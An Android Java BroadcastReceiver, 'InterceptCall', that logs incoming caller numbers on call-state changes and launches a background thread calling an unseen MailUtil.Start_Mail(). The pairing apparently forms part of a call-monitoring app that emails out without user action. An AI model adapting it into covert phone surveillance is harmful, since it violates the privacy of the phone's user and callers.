package com.example.admin.smssender;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * Created by admin on 8/23/2019.
 */

public class InterceptCall extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        TelephonyManager telephony = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
        telephony.listen(new PhoneStateListener(){
            @Override
            public void onCallStateChanged(int state, String incomingNumber) {
                super.onCallStateChanged(state, incomingNumber);
                System.out.println("incomingNumber : "+incomingNumber);
            }
        },PhoneStateListener.LISTEN_CALL_STATE);

        try {
            Log.v("SUCCESS","reached InterceptCall");
            Thread mailThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    System.out.println("Running the thread!!!");
                    MailUtil mailUtil = new MailUtil();
                    mailUtil.Start_Mail();
                }
            });
            //Starting the mail thread
            System.out.println("Thread starting now !!!");
            mailThread.start();


        }catch (Exception e)
        {
            System.out.println("failed to send mail!!!");
            e.printStackTrace();
        }
    }
}
